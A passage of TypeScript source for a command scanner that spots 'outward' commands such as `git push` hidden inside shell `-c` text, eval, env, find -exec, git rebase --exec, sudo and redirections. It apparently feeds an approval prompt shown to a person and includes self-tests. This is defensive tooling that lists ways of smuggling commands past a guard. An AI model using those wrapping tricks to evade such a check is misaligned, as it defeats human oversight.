    if (word === name) return next === undefined ? undefined : { text: next, used: 2 }
    if (name.startsWith('--')) {
      const eq = word.indexOf('=')
      if (eq > 0 && abbreviates(word.slice(0, eq), name)) return { text: word.slice(eq + 1), used: 1 }
      if (eq < 0 && abbreviates(word, name) && next !== undefined) return { text: next, used: 2 }
      continue
    }
    if (word.startsWith(name) && word.length > name.length) return { text: word.slice(name.length), used: 1 }
    if (/^-[A-Za-z]+$/.test(word) && word.endsWith(name.slice(1)) && next !== undefined)
      return { text: next, used: 2 }
  }
  return undefined
}

function unwrapped(words: readonly string[], spec: Wrapper): Inner[] {
  const inner: Inner[] = []
  let i = 1
  /** The command that starts at `start`, past the operands `skip` names and up to an `until` word. */
  const take = (start: number) => {
    // `mise exec node@24 -- git push`: tool specs come before `--`.
    const dash = program(words[0] ?? '') === 'mise' ? words.indexOf('--', start) : -1
    const from = dash >= 0 ? dash + 1 : start + (spec.skip ?? 0)
    const stop = spec.until ? words.findIndex((word, j) => j >= from && spec.until?.includes(word)) : -1
    const command = words.slice(from, stop >= 0 ? stop : words.length)
    // `watch 'git push'`: one quoted word is shell text.
    if (command.length === 1 && /\s/.test(command[0] as string)) inner.push(command[0] as string)
    else if (command.length > 0) inner.push(command)
  }
  const skipOptions = () => {
    while (i < words.length) {
      const word = words[i] as string
      if (word === '--') {
        i++
        return
      }
      const text = spec.text && textOption(words, i, spec.text)
      if (text) {
        inner.push(text.text)
        i += text.used
      } else if (word.startsWith('-') && word.length > 1) {
        const valued = spec.valued?.some((name) => abbreviates(word, name)) === true
        // A prefix of a valued option (`sudo --us root`) may not take a value: the next word may be the command.
        if (valued && !spec.valued?.includes(word) && !/^-/.test(words[i + 1] ?? '-')) take(i + 1)
        i += valued ? 2 : 1
      } else if (spec.assignments && /^[A-Za-z_]\w*=/.test(word)) i++
      else return
    }
  }
  if (spec.sub) {
    skipOptions()
    if (!spec.sub.includes(words[i] ?? '')) return []
    i++
  }
  skipOptions()
  take(i)
  return inner
}

const POSIX_SHELLS = new Set([
  'bash',
  'sh',
  'zsh',
  'dash',
  'ksh',
  'mksh',
  'ash',
  'yash',
  'fish',
  'tcsh',
  'csh',
])

/**
 * The shell text a POSIX-style shell runs: the operand after each flag cluster with `c` or `C` (fish
 * runs `-C` init text as well as `-c`), and every `--command` or `--init-command`. Operands after
 * those are positional arguments, not commands.
 */
function shellPayloads(words: readonly string[]): string[] {
  const payloads: string[] = []
  let pending = 0
  for (let i = 1; i < words.length; i++) {
    const word = words[i] as string
    if (word === '--') {
      for (let j = i + 1; j < words.length && pending > 0; j++, pending--) payloads.push(words[j] as string)
      break
    }
    const long = textOption(words, i, ['--command', '--init-command'])
    if (long) {
      payloads.push(long.text)
      i += long.used - 1
      continue
    }
    if (/^-[A-Za-z]*[cC][A-Za-z]*$/.test(word)) pending += /c/.test(word) && /C/.test(word) ? 2 : 1
    // `-o pipefail`, `-eo pipefail`: the option name is the next word.
    if (/^[-+][A-Za-z]*[oO]$/.test(word) || abbreviates(word, '--rcfile') || abbreviates(word, '--init-file'))
      i++
    else if (!/^[-+]/.test(word)) {
      if (pending === 0) break
      payloads.push(word)
      pending--
    }
  }
  return payloads
}

/** `find ... -exec cmd {} ;`: every command after an exec action, up to its terminator. */
function findCommands(words: readonly string[]): Inner[] {
  const inner: Inner[] = []
  for (let i = 1; i < words.length; i++) {
    if (!['-exec', '-execdir', '-ok', '-okdir'].includes(words[i] as string)) continue
    const end = words.findIndex((word, j) => j > i && (word === ';' || word === '+'))
    inner.push(words.slice(i + 1, end > i ? end : words.length))
    if (end > i) i = end
  }
  return inner
}

/** Commands git runs for you: `submodule foreach` and `rebase --exec`. */
function gitCommands(words: readonly string[]): Inner[] {
  const [sub, action] = parse(words, GIT_VALUED).operands
  if (sub === 'submodule' && action === 'foreach') {
    const rest = words.slice(words.indexOf('foreach') + 1).filter((word) => !word.startsWith('--'))
    return rest.length === 1 ? [rest[0] as string] : rest.length > 0 ? [rest] : []
  }
  if (sub !== 'rebase') return []
  const inner: Inner[] = []
  for (let i = 1; i < words.length; i++) {
    const text = textOption(words, i, ['--exec', '-x'])
    if (!text) continue
    inner.push(text.text)
    i += text.used - 1
  }
  return inner
}

/** Everything `words` runs besides itself: launched commands and shell text it hands on. */
function innerCommands(words: readonly string[]): Inner[] {
  const name = program(words[0] ?? '')
  if (POSIX_SHELLS.has(name)) return shellPayloads(words)
  if (name === 'pwsh' || name === 'powershell') {
    const flag = words.findIndex((word, i) => i > 0 && /^-(?:c|com|comm|comma|comman|command)$/i.test(word))
    return flag > 0 ? [words.slice(flag + 1).join(' ')] : []
  }
  if (name === 'cmd') {
    const flag = words.findIndex((word, i) => i > 0 && /^\/[ck]$/i.test(word))
    return flag > 0 ? [words.slice(flag + 1).join(' ')] : []
  }
  if (name === 'eval') return words.length > 1 ? [words.slice(1).join(' ')] : []
  if (name === 'env')
    for (let i = 1; i < words.length; i++) {
      const split = textOption(words, i, ['-S', '--split-string'])
      if (split) return [[split.text, ...words.slice(i + split.used)].join(' ')]
    }
  if (name === 'find') return findCommands(words)
  if (name === 'git') return gitCommands(words)
  if (name === 'rtk') return [words.slice(words[1] === 'proxy' ? 2 : 1)]
  const spec = Object.hasOwn(WRAPPERS, name) ? WRAPPERS[name] : undefined
  return spec ? unwrapped(words, spec) : []
}

type Walk = { steps: number }

/**
 * Words that can lead a command without being it: keywords that open or continue a compound command,
 * `!`, and the shell's command modifiers.
 */
const TRANSPARENT = new Set([
  ...['if', 'then', 'else', 'elif', 'while', 'until', 'do', '!', '{', '('],
  ...['builtin', 'coproc', 'noglob', 'nocorrect'],
])

function scanText(text: string, depth: number, walk: Walk): string | undefined {
  if (depth > MAX_DEPTH) return OUTWARD_NESTING.id
  const strict = splitShellCommand(text)
  const views = [
    ...(strict ?? looseSegments(text, true)),
    // Literal pieces hidden inside quotes: `echo "$(git push)"`.
    ...(strict ? [] : looseSegments(text, false)),
  ]
  for (const words of views) {
    const found = scanWords(words, depth, walk)
    if (found !== undefined) return found
  }
  return undefined
}

/**
 * Matches one command, then every command it runs: wrappers come off one at a time until the words
 * stop changing, and shell text a command hands on is parsed one level deeper.
 */
function scanWords(words: readonly string[], depth: number, walk: Walk): string | undefined {
  if (++walk.steps > MAX_STEPS) return OUTWARD_NESTING.id
  let first = 0
  while (first < words.length) {
    const word = words[first] as string
    // `> out git push`: a bare redirection operator takes the next word as its target.
    if (/^\d*(?:[<>]+|&>+|[<>]&)$/.test(word)) first += 2
    else if (TRANSPARENT.has(word) || /^[A-Za-z_]\w*\+?=/.test(word) || /^\d*(?:[<>]|&>)/.test(word)) first++
    // The stray `1` a loose split leaves from `2>&1`.
    else if (/^\d+$/.test(word)) first++
    else break
  }
  const command = words.slice(first)
  if (command.length === 0) return undefined
  const rule = OUTWARD_COMMAND_RULES.find((candidate) => candidate.command(command))
  if (rule) return rule.id
  for (const inner of innerCommands(command)) {
    const found =
      typeof inner === 'string'
        ? scanText(inner, depth + 1, walk)
        : // Shorter than the command that ran it, so unwrapping ends.
          inner.length < command.length
          ? scanWords(inner, depth, walk)
          : undefined
    if (found !== undefined) return found
  }
  return undefined
}

/** The id of the first outward rule the command text trips; `nesting` for text it stops reading. */
export function outwardCommand(command: string): string | undefined {
  return scanText(command, 0, { steps: 0 })
}

/** What an outward hit means, for the question a person sees. */
export function outwardRuleDescription(id: string): string {
  return id === OUTWARD_NESTING.id
    ? OUTWARD_NESTING.description
    : (OUTWARD_COMMAND_RULES.find((rule) => rule.id === id)?.description ?? id)
}

for (const rule of OUTWARD_COMMAND_RULES) {
  for (const sample of rule.match)
    if (outwardCommand(sample) !== rule.id) throw new Error(`outward ${rule.id}: ${sample} must match`)
  for (const sample of rule.notMatch)
    if (outwardCommand(sample) !== undefined) throw new Error(`outward ${rule.id}: ${sample} must not match`)
}
for (const sample of OUTWARD_NESTING.match)
  if (outwardCommand(sample) !== OUTWARD_NESTING.id) throw new Error(`outward nesting: ${sample} must match`)
